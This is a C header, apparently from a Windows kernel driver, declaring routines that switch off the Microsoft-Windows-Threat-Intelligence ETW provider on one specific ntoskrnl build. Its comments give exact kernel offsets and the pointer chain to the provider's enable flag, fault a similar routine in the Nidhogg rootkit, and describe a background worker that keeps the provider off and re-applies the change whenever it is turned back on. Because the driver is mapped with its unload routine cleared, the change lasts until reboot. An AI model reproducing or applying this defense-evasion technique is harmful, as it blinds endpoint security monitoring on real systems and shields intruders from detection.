#pragma once
#include "Shared.h"

#ifdef __cplusplus
extern "C" {
#endif

//
// Disables the Microsoft-Windows-Threat-Intelligence (ETW-TI) provider on
// ntoskrnl 10.0.26100.4351 by clearing its IsEnabled flag, and restores the
// original value on request.
//
// Why this is not Nidhogg's arithmetic
// ----------------------------------
// Nidhogg locates the provider's REGHANDLE slot by scanning KeInsertQueueApc for
// "4C 8B 15" and then treats the result as a flat base to add two offsets to:
//
//     base = KeInsertQueueApc + displacement + foundIndex + 7   -> 0x140EFE680
//     IsEnabled = base + 0x20 + 0x60                            -> 0x140EFE700
//
// That anchor is correct on this build, but the second step is not. The global at
// 0x140EFE680 is a pointer variable, not the provider record, so the real chain
// has two indirections before the flag:
//
//     entry = *(ULONG64 *)(nt + 0xEFE680)   // ETW_REGISTRY_ENTRY, pool tag 'EtwR'
//     info  = *(ULONG64 *)(entry + 0x20)     // provider enable record
//     IsEnabled at info + 0x60
//
// Confirmed from EtwProviderEnabled at 0x140344AE0, which reads the slot as
// "mov rax,[rcx+0x20]" followed by "cmp dword ptr [rax+0x60],0". EtwRegister at
// 0x1409967F0 fills the slot from the Threat-Intelligence GUID.
//
// Nidhogg's flat target 0x140EFE700 has zero cross-references and sits in the
// zero-filled tail of .data, and its offset lands past the end of the 0x70-byte
// ETW_REGISTRY_ENTRY that ExAllocatePool2(0x40, 0x70, 'EtwR') returns. Writing
// there neither disables ETW-TI nor stays inside the allocation, so the Nidhogg
// version of this routine is a no-op at best on 26100.
//
// The offsets are treated as specific to 26100.4351 only. Nothing is written for
// any other build: the build number must match and the provider GUID must be
// present at its recorded RVA, so a different kernel fails closed.
//
// Response is optional and may be NULL; when given it is filled with the
// resolved chain and the state after the operation.
//
NTSTATUS EtwTiDisable(PETWTI_STATUS_RESPONSE Response);

//
// Restores the IsEnabled value captured by the last successful EtwTiDisable.
// Safe to call when nothing was disabled. Response follows the same convention
// as EtwTiDisable.
//
NTSTATUS EtwTiEnable(PETWTI_STATUS_RESPONSE Response);

//
// Fills Response with the resolved chain and the live flag value. Read-only: it
// never writes.
//
NTSTATUS EtwTiQueryStatus(PETWTI_STATUS_RESPONSE Response);

//
// TRUE while ETW-TI is disabled by this module.
//
BOOLEAN EtwTiIsDisabled(VOID);

//
// Starts the background worker that applies the disable on its own, so a client
// only ever reads the state back.
//
// Must be called at PASSIVE_LEVEL after OffsetsInitialize() has run. The worker
// retries rather than acting once, because EtwRegister fills the provider slot
// only when the Threat-Intelligence client starts up - on a VM that is commonly
// after this image has loaded, so a single attempt would resolve a NULL slot and
// quietly do nothing. After it succeeds it keeps confirming the flag is still
// down and re-applies if something turns it back on. An explicit EtwTiEnable is
// honoured: the worker goes idle rather than undoing it.
//
// The hold check re-resolves the chain every pass rather than caching the enable
// record address, because ETW allocates a new record whenever a session enables
// the provider. A consumer started after this module has loaded therefore moves
// the record, and the worker follows it to the new one instead of writing into
// the allocation nobody reads any more. What this bounds is the window between a
// session enabling the provider and the next pass pulling it back down; it does
// not prevent the events in that window from being delivered.
//
// DriverUnload is cleared on this mapped-load path, so the worker is never torn
// down and ETW-TI stays off until reboot.
//
NTSTATUS EtwTiInitialize(VOID);

#ifdef __cplusplus
}
#endif
